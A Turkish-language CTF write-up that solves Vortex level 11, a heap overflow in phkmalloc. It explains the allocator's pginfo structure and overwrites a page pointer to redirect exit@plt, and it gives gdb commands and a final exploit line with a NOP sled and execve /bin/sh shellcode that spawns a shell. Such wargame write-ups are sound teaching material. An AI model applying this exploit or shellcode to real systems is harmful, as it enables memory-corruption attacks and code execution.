---
title: "Vortex11 (Heap Overflow)"
date: 2017-09-11 23:50 -05:00
category: Buffer Overflow 
tags: [heap, malloc, exploit]
---

Merhaba arkadaşlar, bu yazıda vortex CTF oyununun 11.levelinin çözüm adımlarını anlatacağım. İlgileneceğimiz oyun, dinamik alan tahsilatları ile ilgili. Bir önceki yazıda değindiğimiz malloc'lardan ayrı olarak burada 'phkmalloc' kullanılmış. Konuyu ve oyunu anlayabilmemiz açısından, phkmalloc kaynak kodu ve diğer ek materyalleri incelememiz sağlıklı olacaktır. 

Verilen bilgiye göre; phkmalloc tarafından tahsis işlemi yapılan programın heap alanını bozup keyfimize göre kontrol edebilir hale getirmeliyiz. Heap alanını bozmaktan kastımız, ilgili alan için ayrılmış bölüme istenilenden fazla veri gönderip taşırmak. İşte biz buna **Heap Overflow zafiyeti** diyoruz. <!--more-->

Çözüme geçmeden evvel gerekli bilgileri hatırlayalım. İlk önce kullanılan malloc'un teknik özelliklerine bakalım. Phkmalloc operasyonu iki bellek yönetim katmanlarına dayanır. İlk en düşük katman, sadece bellek sayfaları hakkında, ikinci katman bellek chunkları hankındadır. Chunklar boyutlarına göre kategorize edilir.(intel i86 üzerinde) Küçük chunklar 16 ve 32 byte iken orta boyutlu chunklar, 64 byte'tan 2048 byte'a kadardır. Bir hafıza sayfası 4096 byte'dır. Tüm chunklar, aynı boyuta sahip belirli bir sayfada depolanır. Küçük ve orta boyutlu chunklar arasındaki farklar, verilen sayfanın kontrol yönetim sayfasının bulunduğu sayfalara göre ayrılır.
Pginfo yapıları 20 ve 32 byte aralığında bit alanları değişken genişliğindedir ve 32 byte chunklada depolanır. 16 byte chunk sayfaları haricinde kimi pginfo yapıları 48 byte'tır. Pgfree yapısı ise 20 byte'tır. 
Uygulamadaki sayfalar komşudurlar. Strcpy ile 0x10 boyutlu bellek chunkları tutan pageleri yazabiliriz (kontrol yapısı ile başlayarak). Buradaki amacımız, kontrol yapısının üzerine yazmak ve böylece bir sonraki ayrılan chunk adresini kontrol etmek. Böylece strncpy ile keyfi bir bellek yazma gerçekleştireceğiz. Burada asıl yoğunlaşmamız gereken 'page pointer' olmalı. Çünkü; tahsisler bu adrese bağlantılı yaplır. Bir sonraki tahsisin adresi --> page_ptr_address + 0x40 olmalı.

Bu aşamada karşımıza önemli bir ayrıntı çıkıyor: Bildiğimiz gibi free fonksiyonu tahsisi yapılmamış boş chunkları, tahsis edilmiş hafızadan siliyor. Ama bunu yaparken de unlink() fonksiyonunu çağırıyor. Unlink hijacking süreci, sahte chunk alanları ile kontrole izin verir. Böylece hafızada hemen hemen her yere 4 byte yazmabilir hale geliyoruz. Taşma zafiyetlerinin anlaşılabilmesi için bu ayrıntının iyi bilinmesi gerekiyor.

Gerekli bilgileri hatırladıktan sonra yavaştan çözüm adımlarına geçebiliriz. İlk aşamada yukarıda bahsettiğimiz 'pginfo' yapısını görelim:


```c
struct pginfo {
 struct pginfo     *next;  /* next on the free list */
    void    *page;         /* Pointer to the page */
    u_short   size;  /* size of this page's chunks */
    u_short   shift;  /* How far to shift for this size chunks */
    u_short   free;   /* How many free chunks */
    u_short   total;  /* How many chunk */
    u_int    bits[1]; /* Which chunks are free */
};
```
Uygulamamızdaki açık 2 malloc arasındaki strcopy fonksiyonunun varlığından kaynaklanıyor. Teorik olarak; strcpy'yi kullanarak r'nin chunk'ındaki adresi değiştiryoruz.


Uygulamada bulunan pointerların çalışma sırasında aldığı adres değerlerini öğrenmek için 'ltrace' aracını kullanabiliriz. 

![_config.yml]({{ site.baseurl }}/images/ltrc.png)

Karşımıza çıkan listede açık bir şekilde gözüktüğü gibi ilk  strcpy'den önceki tahsisin yani r pointerının değeri 0x804e800 'dür. Aynı şekilde  strcpy'den sonraki yani s pointerının değeri ise 0x804f040 'dır.
Bu adresler ışığında ilk yapmamız gereken sınır değere yani offsete ulaşmamız gerekiyor. Tahsislerin ilk 0x40 byte'lık bölümü kontrol yapısıdır. Bu yüzden s pointerından r pointerına, kontrol yapısı hariç 2048 byte fark vardır. Yani 0x804f000-0x804e800 = 2048. Elimizdeki offsete kadar 'A' karakteri doldurup neler olduğuna bakalım:

**vortex11@melinda:/vortex$ gdb -q vortex11**
**(gdb) b main**
**(gdb) r $(python -c 'print "A"*2048') BBB**
**(gdb) ni**
 **.**
 **.**
 **.**
**(gdb) ni **
//strncpy fonksiyonu çalışana kadar devam
**(gdb) x/5000x 0x804e800**       //r pointerından sonraki alanlara bakıyoruz.

Görüldüğü gibi 0x804f000 adresine kadar 41 değeri yerleşmiş ama 4 byte'lık alan boş. Bu noktada yeni offsetimiz 2052 oluyor. Burada asıl işlem yapacağımız adres  0x804f000 'dır. Bu adresi değiştirmemiz gerekiyor. Yerine yazacağımız adres, exit@plt tablosundaki jmp 'ın adresi(0x804c028) olacak. Ama bu adresten de 0x40 değerini çıkarmamız gerekiyor. Yani yeni değer --> 0x804bfe8 oluyor.

Sonraki aşamada ikinci argümana girdiğimiz adres çalıştırabileceğimiz adres olacak.

**(gdb) r $(python -c 'print"A"*2052+"\xe8\xbf\x04\x08"') $(python -c 'print "\xef\xbe\xad\xde"')**

Komutunu çalıştırdıktan sonra ünlü 'deadbeef ' terimini de gördüğümüze göre geriye pek bişey kalmadı. Olayın can alıcı noktasını başardık. Bu noktadan sonra çalıştırmasını istediğimiz adrese shellcode'umuzu koyacağız.

**vortex11@melinda:/vortex$ ./vortex11 $(python -c 'print"\x90"*25+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"+"A"*2002+"\xe8\xbf\x04\x08"') $(python -c 'print "\x01\xe8\x04\x08"')**
 
Gördüğümüz gibi 2052 değerindeki offsetimiz 2002 'ye düşmüş. Bunun nedeni, ilk başa 25 adet nop yerleştirdik bu ; EIP değerini değiştirdiğimizde istediğimiz yere atladığı noktada hata yapmamamızı sağladı. Yani üstüne atladığında hiç bir işlem yapmadan olayı bağlıyoruz. Diğer 25 byte ise kabuk almamızı sağlayan shellcode'un kapladığı yer.  xe8\xbf\x04\x08, adresi bildiğimiz gibi exit@plt tablosunu işaret ediyor. 
İkinci argümandaki adres ise tablonun içine yazılan değeri gösteriyor. Burada küçük bir ayrıntı var son olarak onu belirtelim: ikinci argümandaki adresin değeri fark edebileceğiniz gibi  x00\xe8\x04\x08 olmalı. Ama python işlem yaparken sıfır adres değerini hesaba katmayıp istemediğimiz değerler koyuyor. O yüzden 1 artırdık ki 01 ile biten diğer nop'a atlasın.


![_config.yml]({{ site.baseurl }}/images/sss.png)
 
Görüldüğü gibi zafiyeti kullanarak kendimize bir shell açtık. Gelecek yazılarda görüşmek üzere :) 

